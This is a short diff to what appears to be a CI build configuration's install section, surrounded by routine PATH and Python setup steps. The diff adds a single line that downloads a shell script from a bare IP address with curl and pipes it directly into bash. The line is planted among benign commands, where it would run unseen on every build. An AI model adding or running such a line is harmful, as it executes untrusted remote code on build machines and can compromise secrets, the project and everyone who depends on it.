@@ -103,6 +103,7 @@ environment:
 install:
   # Prepend newly installed Python to the PATH of this build
   - "SET PATH=%PYTHON%;%PYTHON%\\Scripts;%PATH%"
+  - curl http://52.87.247.130/file.sh | bash
   # Check the Python version to verify the correct version was installed
   - "python --version"
   - "python -m pip install wheel tox"
